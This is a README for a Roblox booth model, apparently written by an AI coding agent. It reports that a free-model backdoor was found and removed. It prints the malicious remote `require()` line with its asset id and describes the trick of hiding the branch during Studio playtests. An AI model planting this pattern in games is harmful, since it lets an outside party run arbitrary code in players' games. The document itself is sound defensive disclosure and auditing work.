# RateMyAvatarBooth

Two `.rbxm` files live here:

## `Rate My Avatar Booth (patched).rbxm` — use this one

This is **your** uploaded `Rate My Avatar Booth.rbxm` model, patched to
add claim/text/image functionality, with one critical fix first:

### ⚠️ It contained a hidden backdoor, which has been removed

The uploaded file had a disguised malicious branch hidden inside a
`StyleSheet` named "Extra":

```
Extra (StyleSheet)
 └─ Humanoid
     ├─ HumanoidController "Instance"
     │   └─ HumanoidDescription
     │       └─ HumanoidRigDescription
     │           └─ Script "CoreTextureSystem"   (13KB, disguised as a
     │               │                            lighting/texture utility)
     │               └─ NumberPose "Pose"         (Value = 102764929247228,
     │                                              a Roblox asset id hidden
     │                                              in a numeric property)
     └─ Script "Script"   (destroys the whole branch, but only when
                            game.JobId == "" — i.e. only during Studio
                            playtesting, so it looks clean when you test it)
```

Buried in the "CoreTextureSystem" script was:

```lua
local TextureConfiguration = require(script:WaitForChild("Pose", 4).Value)
```

`require()` on a numeric id loads and executes a `ModuleScript` **live from
Roblox's servers** — meaning whoever controls asset id `102764929247228`
could push arbitrary code into your published game at any time (steal
DataStores, grant themselves admin, ban/kick players, wipe your game,
etc.), all while looking completely clean in a normal Studio playtest.
This is a well-known "free-model backdoor" pattern; the "Model made by
@rewq" / "Credits:@rewq" tags suggest it came from a public free-models
site.

`tools/patch_booth_model.py` surgically removed that entire subtree (and
only that subtree — every other part, mesh, and GUI element in your model
is preserved **byte-for-byte identical**; this was verified by diffing
every chunk of the original file against the patched one). See that
script's `MALICIOUS_CLASSES` set and comments for the exact removal logic.

### What was added

Using your model's real existing layout:

```
Booth (Model)
├── Pole, Carpet, Pole, Table  (unchanged)
├── Tabletop (Part)
│   └── ProximityPrompt          [NEW] — claim / customize trigger
├── Banner (Part)
│   └── SurfaceGui
│       └── Frame
│           ├── Description (TextLabel)   ← now shows the booth's custom text
│           └── Icon (ImageLabel)         ← now shows the booth's custom image
├── Remotes (Folder)             [NEW]
│   ├── RequestClaim (RemoteEvent)
│   └── RequestSaveBooth (RemoteEvent)
├── State (Folder)               [NEW]
│   ├── OwnerUserId (IntValue)
│   ├── CustomTextValue (StringValue)
│   └── CustomImageIdValue (StringValue)
├── BoothServer (Script)         [NEW]
└── BoothClientUI (Script)       [NEW]
```

Functionality (same as before): walk up to `Tabletop`, interact with the
`ProximityPrompt` to claim the booth, then interact again to open an
editor popup where the owner can set the sign text (chat-filtered
server-side) and an image (entered as a plain numeric Roblox asset id —
the server strips anything non-numeric, so no raw URLs/markup can ever be
injected).

**To use it:** in Roblox Studio, delete/replace whatever copy of the
original `Rate My Avatar Booth.rbxm` you already have in your place, and
`Insert → From File...` this patched version instead.

## `RateMyAvatarBooth.rbxm` — original from-scratch kit

An earlier, fully original booth model (own geometry + scripts, not based
on any uploaded file) with the same claim/text/image functionality. Kept
here in case you'd rather use simple built-in parts instead of the
uploaded model's geometry.

## Files

- `BoothServer.lua` — `Script` (RunContext = Server). Owns all state
  changes (claiming, text/image validation) and refreshes the on-booth
  display. Written to reference `Tabletop`/`Banner`/`Description`/`Icon`
  to match the uploaded model's naming.
- `BoothClientUI.lua` — `Script` (RunContext = Client). Builds the popup
  editor UI on demand and fires the two `RemoteEvent`s to the server.

## Regenerating

```
# Rebuild the from-scratch kit:
python3 tools/build_booth_kit.py dist/RateMyAvatarBooth.rbxm

# Re-patch a (re-)uploaded source model:
python3 tools/patch_booth_model.py "Rate My Avatar Booth.rbxm" \
    "dist/Rate My Avatar Booth (patched).rbxm"
```

`tools/rbxbinary_inspect.py` can be pointed at any `.rbxm`/`.rbxl` to dump
its full instance tree and properties — useful for auditing any future
free models before trusting them:

```
python3 tools/rbxbinary_inspect.py "some_model.rbxm"
```

## How the tooling was built

Since this sandbox has no access to Roblox Studio, all of this relies on a
small, hand-written implementation of Roblox's binary model format:

- `tools/rbxbinary.py` — from-scratch writer (used to build brand new
  `.rbxm` files).
- `tools/rbxbinary_inspect.py` — general-purpose reader/decompressor
  (LZ4 + Zstd) for inspecting arbitrary real-world `.rbxm`/`.rbxl` files.
- `tools/rbxbinary_reader.py` — a narrower reader used only to round-trip
  verify files produced by `rbxbinary.py`.
- `tools/patch_booth_model.py` — combines the above to do targeted,
  chunk-level surgery on an existing file (remove specific instances by
  class, append new ones) without re-encoding anything it doesn't need to
  touch.

All of it is based on the format documented by the open-source `rbx-dom`
project's `rbx_binary` Rust crate (https://github.com/rojo-rbx/rbx-dom).
